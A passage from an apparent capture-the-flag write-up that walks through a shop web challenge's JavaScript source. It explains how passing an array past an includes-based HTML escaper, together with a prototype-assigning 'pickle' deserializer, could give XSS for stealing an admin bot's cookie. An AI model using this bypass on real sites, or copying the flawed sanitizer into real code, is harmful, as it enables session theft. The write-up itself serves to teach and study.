+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VMScript</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./shoplib.mjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'export '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+sendOrder(cart, orders)
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/order'</span><span class="token punctuation">,</span> recaptcha<span class="token punctuation">.</span>middleware<span class="token punctuation">.</span>verify<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>
+  req<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>recaptcha<span class="token punctuation">.</span>error <span class="token operator">&amp;&amp;</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">!=</span> <span class="token string">"dev"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"invalid captcha"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>cart<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"bad request"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token comment">// TODO: Group orders by zip code</span>
+  <span class="token keyword">let</span> orders <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> cart <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>cart<span class="token punctuation">;</span>
+  <span class="token keyword">let</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>orders<span class="token punctuation">,</span> cart<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token keyword">await</span> vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  orders <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer<span class="token punctuation">.</span>from</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>orders<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token string">'/order#'</span> <span class="token operator">+</span> orders<span class="token punctuation">;</span>
+  
+  bot<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span><span class="token constant">CHALL_URL</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Our input, <code>req.body.cart</code> is pass to a VM and run <code>sendOrder(cart, orders)</code>.</p>
+<p>After <code>sendOrder</code>, the <code>orders</code> array will be updated and sent to <code>/order</code> as the parameter. Then, the user will be redirected to the order page, and a bot will also visit the page.</p>
+<p>Here is the JavaScript code on the order page:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">as</span> shop <span class="token keyword">from</span> <span class="token string">"/js/shoplib.mjs"</span><span class="token punctuation">;</span>
+
+window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> orders <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>orders<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token punctuation">(</span>orders<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">order</span><span class="token punctuation">)</span> <span class="token operator">=></span>  <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">shop<span class="token punctuation">.</span>DeliveryClient</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span>all<span class="token punctuation">.</span>order<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> client<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>client</code> will be assigned to <code>innerHTML</code>, if we can inject HTML here, we got an XSS that allows us to steal the information(like cookie) of the admin bot.</p>
+<p>Below is the related code snippet for rending HTML:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">escapeHtml</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token operator">=></span> str<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span> <span class="token operator">?</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token parameter">c</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&amp;#</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token operator">:</span> str<span class="token punctuation">;</span>
+<span class="token keyword">const</span> <span class="token function-variable function">renderLines</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token operator">=></span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">p<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span> <span class="token operator">=></span> p<span class="token operator">+</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+&lt;div class="row">
+&lt;div class="col-xl-8">
+  &lt;p></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/p>
+&lt;/div>
+&lt;div class="col-xl-2">
+  &lt;p class="float-end"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>value<span class="token punctuation">,</span> <span class="token string">'quantity'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+  &lt;/p>
+&lt;/div>
+&lt;div class="col-xl-2">
+  &lt;p class="float-end"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>value<span class="token punctuation">,</span> <span class="token string">'price'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+  &lt;/p>
+&lt;/div>
+&lt;hr>
+&lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">getValue</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> p</span><span class="token punctuation">)</span> <span class="token operator">=></span> p<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span>k</span><span class="token punctuation">)</span> <span class="token operator">=></span> arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span>e<span class="token punctuation">.</span>key<span class="token operator">==</span>k<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">renderOrder</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    &lt;div class="container">
+      &lt;p class="my-5 mx-5" style="font-size: 30px;">Delivery Information&lt;/p>
+      &lt;div class="row">
+        &lt;ul class="list-unstyled">
+          &lt;li class="text-black"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token string">'cart/address/street'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token string">'cart/address/number'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/li>
+          &lt;li class="text-muted mt-1">&lt;span class="text-black">Invoice&lt;/span> #</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token string">'orderId'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/li>
+          &lt;li class="text-black mt-1"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toDateString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/li>
+        &lt;/ul>
+        &lt;hr>
+      &lt;/div>
+      
+      </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">renderLines</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token string">'cart/items'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+
+      &lt;div class="row text-black">
+        &lt;div class="col-xl-12">
+          &lt;p class="float-end fw-bold">Total: $1337
+          &lt;/p>
+        &lt;/div>
+        &lt;hr style="border: 2px solid black;">
+      &lt;/div>
+      &lt;div class="text-center" style="margin-top: 90px;">
+        &lt;p>Delivered by </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token function">getValue</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token string">'driver/username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">. &lt;/p>
+      &lt;/div>
+
+    &lt;/div>
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DeliveryClient</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">pickledOrder</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>pickledOrder <span class="token operator">=</span> pickledOrder<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">renderOrder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pickledOrder<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>There is a <code>escpaeHtml</code> function to do the sanitization, it encodes all <code>&lt;</code> if <code>&lt;</code> is in the input.</p>
+<p>Also, we can see that almost all variables are escaped before rendering to the page, it seems that we have no chance to do something bad?</p>
+<p>Not exactly, if you look very carefully.</p>
+<p>In function <code>renderLines</code>, this line is different:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>$&#123;escapeHtml(c.key).toString()&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Why? Because all the other places are <code>escape(something.toString())</code>, cast the input to string then escape, but the one above cast to string “after” escaped.</p>
+<p>If you are familiar with JavaScript, besides <code>String.prototype.includes</code>, there is another function with the same name: <code>Array.prototype.includes</code>.</p>
+<p><code>String.prototype.includes</code> checks if the target is in the string while <code>Array.prototype.includes</code> checks if the target is in the array.</p>
+<p>For example, <code>[&#39;&lt;p&gt;hello&lt;/p&gt;&#39;].includes(&#39;&lt;&#39;)</code> is false because there no <code>&#39;&lt;&#39;</code> element in the array.</p>
+<p>In other words, if <code>c.key</code> is an array, we can bypass the check and rendering <code>&lt;</code>, which caused XSS.</p>
+<p>Now, we have already finished the second half of the challenge. All we need to do is to find the solution for the first half: “how do we make <code>c.key</code> an array?”</p>
+<h2><span id="source-code-generating-order-data">Source code - generating order data</span></h2><p>As I mentioned earlier, the order data is generated by <code>sendOrder</code> function, our goal is to find the vulnerability in its implementation and manipulate the order data.</p>
+<p>Below is the related source code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">const</span> pickle <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token constant">PRIMITIVES</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'String'</span><span class="token punctuation">,</span> <span class="token string">'Number'</span><span class="token punctuation">,</span> <span class="token string">'Boolean'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token function-variable function">loads</span><span class="token operator">:</span> <span class="token parameter">json</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>key<span class="token punctuation">,</span> type<span class="token punctuation">,</span> value<span class="token punctuation">&#125;</span> <span class="token keyword">of</span> json<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^pickled</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> pickle<span class="token punctuation">.</span><span class="token function">loads</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">const</span> constructor <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^pickled</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token operator">||</span>module<span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">globalThis</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token function-variable function">dumps</span><span class="token operator">:</span> <span class="token parameter">obj</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> json <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">const</span> value <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">const</span> type <span class="token operator">=</span> value<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>name<span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> type <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> value <span class="token operator">==</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>pickle<span class="token punctuation">.</span><span class="token constant">PRIMITIVES</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                json<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                    key<span class="token punctuation">,</span>
+                    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'pickled'</span> <span class="token operator">+</span> type<span class="token punctuation">,</span>
+                    <span class="token literal-property property">value</span><span class="token operator">:</span> pickle<span class="token punctuation">.</span><span class="token function">dumps</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> value <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                json<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+                    key<span class="token punctuation">,</span>
+                    type<span class="token punctuation">,</span>
+                    <span class="token literal-property property">value</span><span class="token operator">:</span> globalThis<span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> json<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token constant">DRIVERS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'drivefast1'</span><span class="token punctuation">,</span> <span class="token string">'johnnywalker'</span><span class="token punctuation">,</span> <span class="token string">'onagbike'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">sendOrder</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> orders</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> delivery <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DeliveryService</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Order</span><span class="token punctuation">(</span>
+        pickle<span class="token punctuation">.</span><span class="token function">loads</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token punctuation">)</span><span class="token punctuation">,</span> orders<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> delivery<span class="token punctuation">.</span><span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Driver</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> orders</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>orders <span class="token operator">=</span> orders<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">async</span> <span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token parameter">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        order<span class="token punctuation">.</span>driver <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> pickledOrder <span class="token operator">=</span> pickle<span class="token punctuation">.</span><span class="token function">dumps</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>orders<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pickledOrder<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DeliveryClient</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">pickledOrder</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>pickledOrder <span class="token operator">=</span> pickledOrder<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">renderOrder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pickledOrder<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DeliveryService</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">order<span class="token punctuation">,</span> orders</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>order <span class="token operator">=</span> order<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>orders <span class="token operator">=</span> orders<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
